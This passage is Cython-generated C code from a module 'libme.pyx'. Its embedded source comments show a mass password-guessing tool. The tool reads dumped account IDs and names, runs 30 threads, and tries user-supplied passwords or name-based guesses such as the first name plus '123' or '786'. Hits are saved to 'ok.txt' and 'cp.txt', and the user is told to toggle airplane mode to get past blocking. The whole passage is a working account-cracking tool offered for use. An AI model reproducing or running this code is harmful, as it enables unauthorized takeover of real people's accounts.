                index = 0; __pyx_t_6 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_6)) goto __pyx_L27_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_6);
                index = 1; __pyx_t_10 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_10)) goto __pyx_L27_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_10);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_15(__pyx_t_9), 2) < 0) __PYX_ERR(0, 746, __pyx_L18_error)
                __pyx_t_15 = NULL;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                goto __pyx_L28_unpacking_done;
                __pyx_L27_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_15 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 746, __pyx_L18_error)
                __pyx_L28_unpacking_done:;
              }
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_6);
              __pyx_t_6 = 0;
              __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_10);
              __pyx_t_10 = 0;

              /* "libme.pyx":747
 * 				for user in self.id:
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__file__,uid, listpass.split(","))             # <<<<<<<<<<<<<<
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
              __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 747, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_file); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 747, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_v_listpass, __pyx_n_s_split); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 747, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_16);
              __pyx_t_17 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_16);
                if (likely(__pyx_t_17)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
                  __Pyx_INCREF(__pyx_t_17);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_16, function);
                }
              }
              __pyx_t_9 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_16, __pyx_t_17, __pyx_kp_s__12) : __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_kp_s__12);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 747, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_9);
              __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
              __pyx_t_16 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
                __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_10);
                if (likely(__pyx_t_16)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                  __Pyx_INCREF(__pyx_t_16);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_10, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_10)) {
                PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_t_6, __pyx_v_uid, __pyx_t_9};
                __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 747, __pyx_L18_error)
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_10)) {
                PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_t_6, __pyx_v_uid, __pyx_t_9};
                __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 747, __pyx_L18_error)
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              } else
              #endif
              {
                __pyx_t_17 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 747, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_17);
                if (__pyx_t_16) {
                  __Pyx_GIVEREF(__pyx_t_16); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_16); __pyx_t_16 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_6);
                PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_12, __pyx_t_6);
                __Pyx_INCREF(__pyx_v_uid);
                __Pyx_GIVEREF(__pyx_v_uid);
                PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_12, __pyx_v_uid);
                __Pyx_GIVEREF(__pyx_t_9);
                PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_12, __pyx_t_9);
                __pyx_t_6 = 0;
                __pyx_t_9 = 0;
                __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_t_17, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 747, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              }
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

              /* "libme.pyx":745
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 */
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":736
 * 		ask = input("  [!] Password Method [y/t] : ")
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 */
          }
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          goto __pyx_L23_try_end;
          __pyx_L18_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          /*except:*/ {
            __Pyx_AddTraceback("libme.James.__Frrr__", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_4, &__pyx_t_10) < 0) __PYX_ERR(0, 736, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_17 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_4, __pyx_t_10); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 736, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_17, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 736, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (__pyx_t_13 < 0) __PYX_ERR(0, 736, __pyx_L20_except_error)
            __pyx_t_19 = ((!(__pyx_t_13 != 0)) != 0);
            if (__pyx_t_19) {
              __Pyx_GIVEREF(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_4);
              __Pyx_XGIVEREF(__pyx_t_10);
              __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_4, __pyx_t_10);
              __pyx_t_5 = 0; __pyx_t_4 = 0; __pyx_t_10 = 0; 
              __PYX_ERR(0, 736, __pyx_L20_except_error)
            }
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            goto __pyx_L19_exception_handled;
          }
          __pyx_L20_except_error:;
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_1, __pyx_t_14);
          goto __pyx_L1_error;
          __pyx_L19_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_1, __pyx_t_14);
          __pyx_L23_try_end:;
        }
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (__pyx_t_3) {
            __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 736, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          }
          goto __pyx_L17;
        }
        __pyx_L17:;
      }
      goto __pyx_L32;
      __pyx_L14_error:;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L1_error;
      __pyx_L32:;
    }

    /* "libme.pyx":735
 * 			exit("\n [!] Please Dump File first %s not found"%(myfile))
 * 		ask = input("  [!] Password Method [y/t] : ")
 * 		if ask == "y":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 */
    goto __pyx_L13;
  }

  /* "libme.pyx":748
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 * 		elif ask == "t":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  __pyx_t_19 = (__Pyx_PyString_Equals(__pyx_v_ask, __pyx_n_s_t, Py_EQ)); if (unlikely(__pyx_t_19 < 0)) __PYX_ERR(0, 748, __pyx_L1_error)
  if (__pyx_t_19) {

    /* "libme.pyx":749
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 */
    /*with:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 749, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 749, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 749, __pyx_L1_error)
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_empty_tuple, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 749, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 749, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_10 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 749, __pyx_L33_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_17 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_17)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_17);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_4 = (__pyx_t_17) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_17) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 749, __pyx_L33_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __pyx_t_4;
      __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      /*try:*/ {
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_1, &__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_2);
          /*try:*/ {
            __pyx_v_coeg = __pyx_t_10;
            __pyx_t_10 = 0;

            /* "libme.pyx":750
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 750, __pyx_L37_error)

            /* "libme.pyx":751
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 					for user in self.id:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 751, __pyx_L37_error)

            /* "libme.pyx":752
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")             # <<<<<<<<<<<<<<
 * 					for user in self.id:
 * 						uid, name = user.split("|")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_If_No_Result_Turn_On_Airplane_M) < 0) __PYX_ERR(0, 752, __pyx_L37_error)

            /* "libme.pyx":753
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 					for user in self.id:             # <<<<<<<<<<<<<<
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 */
            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 753, __pyx_L37_error)
            __Pyx_GOTREF(__pyx_t_10);
            if (likely(PyList_CheckExact(__pyx_t_10)) || PyTuple_CheckExact(__pyx_t_10)) {
              __pyx_t_5 = __pyx_t_10; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
              __pyx_t_8 = NULL;
            } else {
              __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 753, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 753, __pyx_L37_error)
            }
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            for (;;) {
              if (likely(!__pyx_t_8)) {
                if (likely(PyList_CheckExact(__pyx_t_5))) {
                  if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_10 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_10); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 753, __pyx_L37_error)
                  #else
                  __pyx_t_10 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 753, __pyx_L37_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  #endif
                } else {
                  if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_10 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_10); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 753, __pyx_L37_error)
                  #else
                  __pyx_t_10 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 753, __pyx_L37_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  #endif
                }
              } else {
                __pyx_t_10 = __pyx_t_8(__pyx_t_5);
                if (unlikely(!__pyx_t_10)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 753, __pyx_L37_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_10);
              }
              __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_10);
              __pyx_t_10 = 0;

              /* "libme.pyx":754
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 					for user in self.id:
 * 						uid, name = user.split("|")             # <<<<<<<<<<<<<<
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:
 */
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 754, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_17 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_4);
                if (likely(__pyx_t_17)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                  __Pyx_INCREF(__pyx_t_17);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_4, function);
                }
              }
              __pyx_t_10 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_17, __pyx_kp_s__38) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_s__38);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 754, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_10))) || (PyList_CheckExact(__pyx_t_10))) {
                PyObject* sequence = __pyx_t_10;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 754, __pyx_L37_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_4 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_17 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_4 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_17 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_4);
                __Pyx_INCREF(__pyx_t_17);
                #else
                __pyx_t_4 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 754, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_17 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 754, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                #endif
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_9 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 754, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                __pyx_t_15 = Py_TYPE(__pyx_t_9)->tp_iternext;
                index = 0; __pyx_t_4 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_4)) goto __pyx_L45_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_4);
                index = 1; __pyx_t_17 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_17)) goto __pyx_L45_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_17);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_15(__pyx_t_9), 2) < 0) __PYX_ERR(0, 754, __pyx_L37_error)
                __pyx_t_15 = NULL;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                goto __pyx_L46_unpacking_done;
                __pyx_L45_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_15 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 754, __pyx_L37_error)
                __pyx_L46_unpacking_done:;
              }
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_4);
              __pyx_t_4 = 0;
              __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_17);
              __pyx_t_17 = 0;

              /* "libme.pyx":755
 * 					for user in self.id:
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]             # <<<<<<<<<<<<<<
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
              __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_v_name, __pyx_n_s_split); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 755, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_17);
              __pyx_t_4 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
                __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_17);
                if (likely(__pyx_t_4)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
                  __Pyx_INCREF(__pyx_t_4);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_17, function);
                }
              }
              __pyx_t_10 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_17, __pyx_t_4, __pyx_kp_s__43) : __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_kp_s__43);
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 755, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              __pyx_t_17 = __Pyx_GetItemInt(__pyx_t_10, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 755, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_17);
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_XDECREF_SET(__pyx_v_ft, __pyx_t_17);
              __pyx_t_17 = 0;

              /* "libme.pyx":756
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 */
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 756, __pyx_L37_error)
              __pyx_t_19 = ((__pyx_t_20 >= 6) != 0);
              if (__pyx_t_19) {

                /* "libme.pyx":757
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
                __pyx_t_17 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 757, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 757, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 757, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 757, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_6 = PyList_New(5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 757, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_6, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_17);
                PyList_SET_ITEM(__pyx_t_6, 1, __pyx_t_17);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_6, 2, __pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_6, 3, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_6, 4, __pyx_t_9);
                __pyx_t_17 = 0;
                __pyx_t_10 = 0;
                __pyx_t_4 = 0;
                __pyx_t_9 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_6));
                __pyx_t_6 = 0;

                /* "libme.pyx":756
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 */
                goto __pyx_L47;
              }

              /* "libme.pyx":758
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 */
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 758, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 3) != 0);
              if (!__pyx_t_13) {
              } else {
                __pyx_t_19 = __pyx_t_13;
                goto __pyx_L48_bool_binop_done;
              }
